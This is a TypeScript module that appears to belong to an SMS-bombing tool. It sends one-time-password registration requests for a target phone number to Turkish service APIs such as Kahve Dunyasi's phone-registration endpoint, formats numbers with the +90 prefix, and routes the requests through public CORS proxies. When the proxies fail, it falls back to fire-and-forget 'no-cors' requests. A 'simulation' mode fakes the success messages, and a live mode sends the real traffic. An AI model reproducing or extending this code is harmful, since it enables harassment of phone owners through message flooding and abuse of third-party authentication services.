import { ServiceDefinition, RequestStatus, LogEntry } from '../types';

// List of proxies to try in order. If one fails, we try the next.
const PROXY_LIST = [
  "https://api.codetabs.com/v1/proxy?quest=",
  "https://corsproxy.io/?",
];

const formatPhone = (phone: string, formatType: 'raw' | 'zero' | '90' | 'plus90' | 'space'): string => {
  const p = phone.replace(/\D/g, ''); 
  switch (formatType) {
    case 'zero': return `0${p}`;
    case '90': return `90${p}`;
    case 'plus90': return `+90${p}`;
    case 'space': return `0 (${p.substring(0,3)}) ${p.substring(3,6)} ${p.substring(6,8)} ${p.substring(8)}`;
    case 'raw': default: return p;
  }
};

const buildRequestParams = (serviceId: string, phone: string, mail: string) => {
  const cleanMail = mail || "memati.bas@example.com";
  // In no-cors mode, we can't strictly enforce application/json content-type in a way that preflight checks like.
  // But we send it anyway.
  const commonHeaders = {
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/plain, */*',
  };

  switch (serviceId) {
    case 'kahve_dunyasi':
      return {
        url: 'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',
        options: {
          method: 'POST',
          headers: commonHeaders,
          body: JSON.stringify({ countryCode: "90", phoneNumber: formatPhone(phone, 'raw') })
        }
      };
    // ... (logic remains same for builder)
    default:
      return {
        url: `https://${serviceId}`,
        options: {
          method: 'POST',
          headers: commonHeaders,
          body: JSON.stringify({ phone: formatPhone(phone, 'raw') })
        }
      };
  }
};

/**
 * Executes the network call.
 */
export const simulateNetworkCall = async (
  service: ServiceDefinition, 
  targetPhone: string,
  email: string | undefined,
  useSimulation: boolean
): Promise<LogEntry> => {
    
  const startTime = performance.now();
  
  // --- SIMULATION MODE (SAFE) ---
  if (useSimulation) {
      await new Promise(r => setTimeout(r, 200 + Math.random() * 600));
      const rand = Math.random();
      if (rand > 0.95) {
          return {
            id: Math.random().toString(36).substr(2, 9),
            timestamp: new Date().toLocaleTimeString(),
            serviceName: service.name,
            status: RequestStatus.FAILED,
            message: `500 Internal Server Error (Simulated)`,
            latency: Math.round(performance.now() - startTime),
          };
      }
      return {
        id: Math.random().toString(36).substr(2, 9),
        timestamp: new Date().toLocaleTimeString(),
        serviceName: service.name,
        status: RequestStatus.SUCCESS,
        message: `200 OK | OTP Sent to ${targetPhone}`,
        latency: Math.round(performance.now() - startTime),
      };
  }

  // --- LIVE MODE (REAL TRAFFIC) ---
  const { url, options } = buildRequestParams(service.id, targetPhone, email || "");

  // STRATEGY 1: Try Proxies First
  for (const proxyBase of PROXY_LIST) {
      try {
        const proxyTarget = `${proxyBase}${encodeURIComponent(url)}`;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 4000);

        const response = await fetch(proxyTarget, {
            ...options,
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);

        if (response.ok) {
            return {
                id: Math.random().toString(36).substr(2, 9),
                timestamp: new Date().toLocaleTimeString(),
                serviceName: service.name,
                status: RequestStatus.SUCCESS,
                message: `200 OK | Proxy: ${new URL(proxyBase).hostname}`,
                latency: Math.round(performance.now() - startTime),
            };
        } 
      } catch (error) {
        continue; // Try next proxy
      }
  }

  // STRATEGY 2: FIRE AND FORGET (NO-CORS)
  // If proxies fail, we send the request directly with no-cors. 
  // We won't know if it succeeded, but we know we sent it.
  try {
      await fetch(url, {
          method: options.method,
          body: options.body,
          mode: 'no-cors', // <--- THE MAGIC FIX
          // Note: headers are restricted in no-cors, but some APIs might still parse the body
      });

      return {
          id: Math.random().toString(36).substr(2, 9),
          timestamp: new Date().toLocaleTimeString(),
          serviceName: service.name,
          status: RequestStatus.SENT, // "Yellow" status
          message: `Request Transmitted (Opaque Response)`,
          latency: Math.round(performance.now() - startTime),
      };
  } catch (e) {
      // If even that fails (rare)
      return {
          id: Math.random().toString(36).substr(2, 9),
          timestamp: new Date().toLocaleTimeString(),
          serviceName: service.name,
          status: RequestStatus.FAILED,
          message: "Connection Refused",
          latency: Math.round(performance.now() - startTime),
      };
  }
};